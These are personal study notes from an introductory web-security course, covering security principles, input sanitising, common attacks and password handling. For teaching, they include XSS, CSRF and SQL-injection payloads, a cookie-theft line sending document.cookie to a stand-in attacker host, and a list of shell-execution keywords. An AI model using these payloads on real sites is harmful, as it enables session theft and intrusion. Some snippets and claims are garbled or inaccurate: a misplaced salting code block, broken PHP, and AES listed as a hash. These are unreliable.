---
layout: default
title: "Lynda.com: Programming Foundations: Web Security"
categories: drafts
---

![image](https://user-images.githubusercontent.com/4011348/50419329-55789700-086b-11e9-92c9-194cf6cfecc8.png)

* Course: [Lynda.com: Programming Foundations: Web Security](https://www.lynda.com/Web-Development-tutorials/Foundations-Programming-Web-Security/133330-2.html)
* Author:  [Kevin Skoglund](https://www.lynda.com/Kevin-Skoglund/104-1.html)
* Released: 2/19/2014 
* Duration: 3h 33m
* Skill Level: Beginner
* Course Description

> Learn about the most important security concerns when developing websites, and what you can do to keep your servers, software, and data safe from harm. Instructor Kevin Skoglund explains what motivates hackers and their most common methods of attacks, and then details the techniques and mindset needed to craft solutions for these web security challenges. Learn the eight fundamental principles that underlie all security efforts, the importance of filtering input and controlling output, and smart strategies for encryption and user authentication. Kevin also covers special considerations when it comes to credit cards, regular expressions, source code managers, and databases.

> This course is great for developers who want to secure their client's websites, and for anyone else who wants to learn more about web security.

> Topics include:
> - Why security matters
> - What is a hacker?
> - How to write a security policy
> - Cross-site scripting (XSS)
> - Cross-site request forgery (CSRF)
> - SQL injection
> - Session hijacking and fixation
> - Passwords and encryption
> - Secure credit card payments


## Table of Content
{:.no_toc}

* A markdown unordered list which will be replaced with the ToC, excluding the "Contents header" from above
{:toc}

## Introduction

### Introduction

- Overview
- Different type of hacks
- Fundamental Security Principle
- Techniques behind the most common attacks on your server

## 1. Security Overview

### What is security?
- Definition: Keep a web server and its applications protected or safe from harm
- Awareness + Protection = Security
- General principle to follow
- Most common attacks
- Useful strategies

### Why security matters
- The low threshold of entry may leave the impression that web development is easy
- 

### What is a hacker?

### Total security is unachievable

> The only secure computer is one that's unplugged, locked in a safe, and buried 20 feet under the ground in a secret location... and I'm not even too sure about that one.
> —Dennis Hughes, FBI
From: <https://en.wikibooks.org/wiki/UNIX_Computing_Security/Introduction>

- There are always ways to gain access that we don't expect.
- Newly discovered vulnerabilities are called zero-day exploits.
- zero-day exploits: known only to hackers, kept secret and traded
- How much security?
    - Should match your needs and goals
    - Execute the security you need really well
    - Re-evaluate periodically

### Get in the security mind-set

- Everyone, all the time
- Weakest link in your security is your level of security
- Average users have to be mindful of security
- Decision makers have to be mindful of security
- Security may require time and money
- Allocate for security in project timelines

Regular security reviews
- Review all technology in use
- Review code in use and still in development
- Review procedures
- Review access privileges
- Educate and re-educate


Better developers
- Fully learn technologies
- Better programmers write more secure programs
- Write software tests for common security concerns

### Write a security policy

Security policy
- Communicates how information assets are protected
- Rules or guidelines
- Keep it simple, clear, and easy to follow
- Involve all stakeholders
- Review periodically - security concerns change

## 2. General Security Principles

### Least privilege

- > We assume that because they're friendly, they wouldn't do us harm
- > "Every program and every privileged user of the system should operate using the least amount of privilege necessary to complete the job. - Jerome Saltzer, Communications of the ACM"
- <https://en.wikipedia.org/wiki/Principle_of_least_privilege>
- Code should be limited in what it exposes and what it accesses.

```php
class User {
    public $valid_users = array('tom', 'mary', 'steve');
    public $password = 'secretpassword'

    public function authenticate($user, $pwd) {
        return in_array($user, $valid_users) && password_matches($pwd);
    }

    public function password_matches($pwd) {
        return $password == $pwd;
    }
}
```

Least Privilege Benefits
- Code stability
    - Controlled data access
    - Easier to test actions and interactions
- System security
    - Vulnerabilities are limited and localized

### Simple is more secure

- Complexity invites bugs
- Use clearly named functions and variables
- Write code comments
- Break up long section of code into small functions
- Don't repeat yourself
- Legacy code is a security concern
- Built-in functions are often better than your own version
- Disable or remove unused feature when possible

### Never trust users

- Well-meaning users can cause problems
- Be paranoid: You have to adopt the mindset that everyone is out to get you. 
- Don't even trust admin users completely
    - Can become unhappy employees or ex-employees
    - May not take security seriously
    - Can have identity stolen
- Use caution with contractors
    - Both insider and outsider status
    - Often not fully vetted
    - Often transient
    - Make it easy to revoke their access
- Even offline
    - Phone: the famous hacker Kevin Mitnick recounts that much of his computer hacking was done by calling up people on the telephone and convincing them that he was trustworthy
    - Email
    - Printing

### Expect the unexpected
- Security is not reactive: your job is to figure out how that will happen ahead of time
- Prevent the crime before it happens
- "What are all the things a user could try on this page?
- Consider "edge cases"
- Get creative
- Example: Global search box
    - Length: too little or too much
    - Content-type: high-ASCII, multi-byte
    - Content: \"'(){}@#%@^%^#^&
    - Formats: safe for use in all formats
    - Structure and inputs: can they be modifed

### Defense in depth
- is like having an extra (backup) parachute for yourself.
- Layered defenses
- Redundant security
- Dimensions
    - People 
    - Technology
    - Operations

### Security through obscurity
- More information benefits hackers: e.g. `Apache 2.2` or URL includes a file ending that gives away the language or the technology that you're using
- Limit exposed information
- Limit feedback
    - On a login page, if a username and password don't match, don't say which one of the two failed.
    - On a page that allows you to retrieve a forgotten password, you shouldn't acknowledge whether or not a user name is in the database
- Obscurity does not mean misdirection


### Blacklisting and whitelisting
- Blacklisting: "No access" list
- Whitelisting: Reference list for what is permitted (more secured approach)
- Example
    - html tags: whitelist or blacklist

### Map exposure points and data passageways
- Incoming Exposure Points
    - URLs
    - Forms
    - Cookies/Sessions
    - Database reads
    - Your public APIs
- Outgoing Exposure Points
    - HTML
    - JavaScript/JSON/XML/RSS
    - Cookies/Sessions
    - Database writes
    - Third-party APIs
- Understand site topography

## 3. Filtering Input, Controlling Output

### Regulating requests
- *Scenario*: attachment upload
- `GET` requests: URLs, links
- `POST` requests: forms
- `CONNECT`, `DELETE`, `HEAD`, `OPTIONS`, `PUT`, `TRACE`
- Regulate Request/Response Format
    - Request `Content-Type` is format of the sent data
    - Request `Accept` is format for the returned data
    - HTML, JSON, XML, Text
    - Any MIME type (RSS, PDF, image, audio, video)

### Validating input
- Is the input acceptable?
- Determine data expectations
- Prevent bugs, as well as hacks
- Consider application and database requirements
- Only allow expected data in submission
- Common Validations
    - Presence / Length
    - Type
    - Format
    - Within a set of values
    - Uniqueness (for example: user name, blog title)
- Whitelisting vs. blacklisting
- Double-check validation logic

### Sanitizing data
- Is the data potential dangerous? (stored in SQL database/used in JavaScript)
- Neutralize, render harmless
- Use type casting vs. Type juggling
- Sanitize SQL, HTML, JavaScript, JSON, XML, etc
    - Encode Characters: Replacing powerful characters with harmless equivelents
        - HTML: `<` with `&lt;`
    - Escaping Characters: Add escape characters before powerful characters
        - SQL: `WHERE name='fake\' AND 1=1--'`
    - Do not write custom sanitization methods
        - Use well-tested, language-specific functions
    - Do not remove or correct invalid data
```js
    // Hacker tries:
Input = "<script>alert ("Gotcha!");</script>"
// You remove <script> and </script> tags:
Input = "alert("Gotcha!")"
// Hacker tries:
Input = "<scr<script>ipt>alert ("Gotcha!");</scr</script>ipt>"
// You remove <script> and </script> tags:
input  = "<script>alert ("Gotcha!");</script>"
```
- Consider where the data will go
- Consider where the data might go later
- Sanitize early, sanitize late, sanitize often    

### Labeling variables
- Use names to identify condition of data
- `dirty`, `raw`, `tainted`, `unsafe`
- `clean`, `filtered`, `sanitized`, `safe`

```php
$raw_email = $_POST['email'];
$safe_email = sanitize($raw_email);
// More often than not you would just do it as a one step process
$safe_email = sanitize($_POST['email']);
```

```ruby
dirty = {}
clean = {}
dirty["first_name"] = params["user"]["first_name"]
clean["first_name"] = sanitize(dirty["first_name"])

clean_params = {}
clean_params["first_name"] = sanitize(params["user"]["first_name"])
```
### Keeping code private
- Public directory
    - Accessible by the web server
    - Point of entry to your web site or application
    - Be smart about code in public pages
- Library directory
	- Not accessible by the web server 
	- Accessible by your code via the file system
- Web server configuration
    - Set document root (public directory)
    - Allow/deny access
- `.htacess` file (apache)
    - Authorization, authentication, blocking

### Keeping credentials private
- Plain text credential are dangerous
    - Give them highest level of care
    - Keep them separate from code
    - Keep them out of version control systems (hard to purge from the history)
    - Have as few copies as necessary
    - Developers should all have their own separate databases
- Do not reuse passwords
    - Unique for every computer, environment, database
- Prefer hashed password whenever possible
- Public-key cryptography
    - example: SSH keys
    - different from using a password: we don't send our password, we don't send our private key
    - SSH agent, Keychain(one master password)
    - SSH agent forwarding

### Keeping error messages vague
- Turn off detailed error reporting for production server
- Return generic 404 and 500 error pages
- Developers can look up errors in log files 
- Configure web server to use same error pages
- Should not give any indication of where things went wrong (server level or application level)

### Smart logging
- Errors
- Sensitive actions (such as logging in, exporting files, deleting database records)
- Possbile attacks
- Data Worth Logging
    - Date and time
    - Source (user and/or IP)
    - Action
    - Target
    - Cookie/session
    - URL and all parameters (raw request)
    - Backtrace (error stack)
- Activity Logging
    - Keep an activity History or Audit Trail
        - Add database table called 'logs'
        - Write a function to add entries with a timestamp
        - Call the fuction whenever an admin makes a change
    - Review logs routinely
- Don't log sensitive data
    - Beware POST parameters and database queries
    - Filter out passwords, keys, and tokens
- Keep old content
    - versioning
    - Paranoid delete

## 4. The Most Common Attacks

### Cross-site scripting (XSS)

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- Awareness of what you're up against make up half the work of becoming secure
- Hacker can inject JavaScript into a web page
- Used to trick users into running injected JavaScript code
- Used to steal cookies, potentially session data which is has been linked with a cookie
- Examples
```html
// HTTP Request
GET /register.php?email=<script>alert("Gotcha!");</script>
// PHP
Email: <%= email %>
// Rendered HTML
Email: <script>alert("Gotcha!");</script>
```

```html
// Reference: https://brakemanscanner.org/docs/warning_types/cross_site_scripting_to_json/
// Ruby on Rails
<script>
    var user_list = <%= @users.to_json %>;
</script>
// From database data
email = "fake@email.com\"}; alert('Gotcha!'); //"
// Rendered
<script>
    var user_list = [
        {name: "jizu", email: "fake@email.com"}; alert('Gotcha!'); //},     
        {name: "foo", email: "bar"}
    ]
</script>
```

- Solution
    - Sanitize any dynamic text that gets output to browser
    - HTML, JavaScript, JSON, XML, etc.
    - Especially data directly from URLs or forms
    - Database, cookie, session data too
    - Whitelist the allowed HTML tags, sanitize everything else

### Cross-site request forgery (CSRF)

- Hacker tricks users into making a request to your server
- Can be used for fraudulent tricks
- Can take advantage of a user's logged in state
- Example 1 
```
https://fun-poll.com/vote?hacker=5674
<img src="https://fun-poll.com/vote?hacker=5674" />
```
- Example 2
```
// You log into your account
// You close browser window, but don't log out
<img src="https://bank.com/transfer?amount=1000&to=978676" />
```
- Solution
    - GET requests should be idempotent
    - **idempotent**: makes no changes, can be called repeatedly
    - Store a **form token** in user's session
    - Add a hidden field to forms with form token as value
    - Compare session form token and submitted form token

### SQL injection
- Hacker is able to execute arbitrary SQL requests
- Can be used to probe database schema
- Can be used to steal database data
- Can be used to add or change database data
- Can be used to destroy database data
- Example
```
SELECT * from users
WHERE username = '${username}' AND password = '${password}'

username = "jsmith' OR 1=1; -- "
password = "blank"
```
- Solution
    - Give limited privileges to application's database user
    - Sanitize input
    - Escape for SQL

### URL manipulation
- It's dangerous because it's so easy to execute  
- Simply editing the URL string to probe the site  
- Can be used for revealing private information
- Can be used for performing restricted actions   
- Examples
    - `http://yoursite.com?invoice=A-17391`
    - `http://yoursite.com?authorize?UserID=987655113`
    - `http://yoursite.com?SESSIONID=AG383DIJ98832`
    - `http://yoursite.com/product?preview=false`
    - `http://yoursite.com/images/small/rockymtns.jpg`
    - `http://yoursite.com/reports/export/sales`
- Solution
    - Realize that URLs are exposed and editable
    - Don't use obscurity for access control
    - Keep error messages vague
    - Clarify GET and POST requests
        - `GET` requests should be idempotent (no changes) 
        - `POST` requests should be used for making changes
    - Prepared statements

### Faked requests and forms
- Normally the request header information is generated by the browser, 
and we don't ever actually work with that header information. 
- But they can also be manufactured, aka, **faked** or **spoofed**
- Faked Requests
```
GET /somepath HTTP/1.1
Host: somesite.com
Referer: 
User-Agent: 
Accept:
Accept-Language:
Accept-Encoding:
Accept-Charset:
Cookie:
```
- Faked Forms
    - Can be used to edit hidden field values
    - Can be used to remove client-side validation
    - e.g. Length limit with JavaScript 
- Fakes Forms Solution
    - Do not reply on client-side data validation
- Use CSRF token

### Cookie visibility and theft
- Cookies can be stolen using XSS attack
``'http://hacker.com?steal=' + document.cookie``
- Cookies can be sniffed by observing network traffic
- Cookie Solutions
    - Only put non-sensitive data in cookies (e.g., preferences)
    - Use `HttpOnly` cookies
        - will make the cookie unavailable to JavaScript
        - Still not supported by older browsers
    - Use Secure cookies (HTTPS only), which means you can't eavesdrop on them
    - Set cookie expiration date
    - Set cookie domain and path
- Encrypt cookie data
- Use server-side sessions instead of client-side cookies (not considering session hijecking yet)

### Session hijacking

- Session ID is used to reference sensitive data on the server  
- Similar to cookie theft but much more valuable
- Can be used to assume your identity and logged-in status
- Can be used to steal personal info, change password
- Often done by network eavesdropping
    - Beware of open wireless networks at coffe shops!
- Session hijacking Solutions
    - Save user agent in session and confirm it(weak)
    - Check IP address (buggy)
    - Use `HttpOnly` cookies
- Regenerate session identifier periodically, at key points
- Expire/remove old session files regularly
    - Keep track of last activity in session 
- Use SSL
- Use Secure cookies

### Session fixation

- A hacker gives you a session ID to use instead 
- Example
```
GET /login HTTP/1.1
Host: yourbank.com
Cookie: SESSION_ID=3e3531fa4ba...

http://yourbank.com/login?SESSION_ID=a1b2c3d4e5...
```
- Session Fixation Solutions
    - Regenerate session identifier periodically, at key points
    Especially important to regenerate after log in

### Remote system execution

- Remotely run operating system commands on a web server
- System Execution Keywords
```
system
exec
shell
sh
shell_exec
open
popen
proc_open
call
subprocess
spawn
passthru
eval
%x
`
```
- Solution
    - Avoid system execution keywords
    - Understand the commands and their syntax completely
    - Perform system execution with extreme caution
    - Add additional data validations

### File-upload abuse

- Can be used to upload too much 
- Can be used to upload malicious files
- Solution
    - Require user authentication, no anonymous uploads
    - Limit maximum upload size
    - Limit allowable file formats, file extensions
    - Use caution when opening uploaded files
    - Do not host uploaded files which have not been verified (virus-scan)

### Denial of service

- Attempt to make a server unavailable to users
- Usually performed by overloading a server with requests
- Includes DNS and routing disruption
- Includes using up disk space, processor power, bandwidth
- Attacks often preformed by distributed network ("DDoS")
- Cheap to launch, difficult to prevent
- Solution
    - Firewalls
    - Switches and routers
    - Load management hardware / software (load-balancer)
    - Collection of reverse proxies
    - Keep infrastructure up to update
    - Make network traffic visible
    - Develop a response plan
    - "Black hole" or "null route" traffic

## 5. Encryption and User Authentication

### Password encryption

- Never store password in plain text
- Compromises user on your site
- Compromises user on other sites
- One-way encryption (hashing algorithm)
    - One-way means non-reversible, even by us
    - **Same inputs + same hashing algorithm = same output**
    - Encrypt attempted password, compare against stored one
- Hashing algorithms 
    - MD5: not considered safe anymore (rainbow)
    - SHA-1
    - SHA-2
    - Whirlpool
    - Tiger
    - AES
    - **Blowfish**
        - Slow: againt brute-force attacks
        - Secure
        - Free
        - Easy

### Salting passwords

- Rainbow tables: pre-computed tables of password hashes for each hashing algorithm 
- Salting
    - Additional data added to the password before encryption
    ```js
- Store salt in Database
    - When using user data for salt and user data could change
    - When using random salt
    - Just the salt, not the password
    const saltedPassword = `Put salt on the ${password}`
    ```
    - Knowing password requires also knowing the salt string
    - Rainbow tables could be used, but they would be almost impossible large
- Unique Salt
    ```js
    const uniqueSaltedPassword = `Put salt on the ${password} for ${username}`
    ```
    - Knowing password requires also knowing the salt string and username
- Random Salt
    ```js
    const uniqueSaltedPassword = `Put salt on the ${password} at ${timestamp}`
    ```
- Store salt in Database
    - When using user data for salt and user data could change
    - When using random salt
    - Just the salt, not the password

### Password requirements
- Require length, but do not limit length. (The hashed values would always be of the same length)
- Require non-alphanumeric characters (against simple rainbow table)
- Confirm password
- Report password strength: weak, normal, or strong?
- Do not record a password hint
- Security questions are questionable 

### Brute-force attacks

- Systematically trying all possible input combinations until the correct solution is found
- aka "Exhaustive key search"
- Dictionary attack
- KeySpace^KeyLength * TimePerAttempt = TimeRequired
- Solution
    - Timing and throlling
    - Slow password hashing algorithms
    - Logging
    - Blacklisting

### Using SSL for login

- SSL: Secure Sockets Layer
- Encrypts all data exchanged with server
- Advantages
    - Prevents snoop
    - Prevents session hijacking
    - Performance penalty due to encryption/decryption time
    - Requires all assets to be secure

### Protecting cookies

- Use `HttpOnly` cookies
- Regenerate session identifier periodically, at key points
- Expire/remove old session files regularly
- Do not accept session identifiers from GET or POST variables
- Use SSL
- Use Secure cookies

### Regulating access privileges

- Least privileges
- Be organized
- Make privileges easy to revoke
- Restrict access to access privilege administration tools
- Evaluate organizational needs and workflow
- Be careful about getting to fine-grained
- Divide restricted actions into 'privileges areas"

### Handling forgotten passwords

- What proves someone's identity?
- Privileged information (e.g., ATM card number plus PIN)
- Security challenge questions
- Send email with new password
- Send email with reset token
- Email a Reset token
    - Request the user name to reset
    - Always respond positively 

        > We'll send you an email ... 

        rather than,

        > Sorry your user name is not found ...
    - Generate a unique token, store in database
    - Store token generation time, limit time for use
    - Email a URL that includes token
    - URL grants access; allows setting password

### Multi-factor authentication (MFA)

- Requires two (or more) factors:
    - Something only the user knows
    - Something only the user has: RSA SecurID device, "Authenticator" mobile app
    - Something only the user is: Biometrics, Fingerprint, voice, retina
- MFA Web Implementation
    1. User create an account
    2. Site logs computer being used: IP address, set cookies, other characteristics 
    3. Future logins from same device approved: "knows" password, "has" computer
    4. Future logins from new device require additional factor
        - Send email to account on file ("knows" password, "has" email account)
        - Send SMS message to mobile phone ("knows" password, "has" mobile phone)
        - Call phone on file with recorded message ("knows" password, "has" mobile phone)
- Pitfalls
    - Users are not familiar
    - Reliability

## 6. Other Areas of Concern

### Credit card payments

- PCI Compliance

### Regular expression flaws
- > Some people, when confronted with a problem, think "I know, I'll use regular expressions." Now they have two problems.
<https://en.wikiquote.org/wiki/Jamie_Zawinski>
- It doesn't have to be complicated to be flawed
- Examples
    - A string of user input contains only letters and numbers
    ```js
    const regexp = /[a-zA-Z0-9]*/

    // * matches zero or more characters
    // + matches one or more characters 

    // a failure case: empty string
    ```
    - Check for data string is in a correct format
    ```js
    const regexp = /^\d{4}-\d{2}-\d{2}$/

    // ^ matches start of line
    // $ matches end of line

    // \A matches start of string
    // \Z matches end of string
    
    // a failure case: 
    // const str = "2018-12-25
    hello world"
    ```
    - Pull out the first name and the last name from that data
    ```js

    const regexp = /First: (.+), Last: (.+),/

    // a failure case: "First: Tom, Last: Smith, City: Denver,"
    
    // .+ is greedy
    // .+? is non-greedy
    ```

### Conversions and transformations

### Buffer overflows

- Problems for low-level programming languages

### Source code managers

- Source code manager: SCM
- Version Control Systems: VCS
- Some fundamental principles:
    - Control Access to Repositories
        - Public or private
        - Policy and procedure for removal of distributed code
        - Open source model: read-only, fork, pull request
    - Control Content in Repositories 
        - Do not commit databases, credentials, tokens, hashes
        - **Delete** does not **purge** data from the history

### Database security

- Set a root password
- Connect using a user besides root
- Least privilege
- Allow access only from localhost or specific IP address
- Back up databases regularly (weekly, nightly, hourly)

### Server security

- Secure or disable root user login
- Access privileges
- SSH keys
- Customize connection port numbers (SSH, FTP, etc...)
- Firewall: single point of control
- Keep software up to date

## Conclusion

### Goodbye

- > Security is a very deep topic, but my hope is that you now have a core knowledge that you can build on. 


![image](https://user-images.githubusercontent.com/4011348/50419541-40503800-086c-11e9-8b6f-f406d7918800.png)
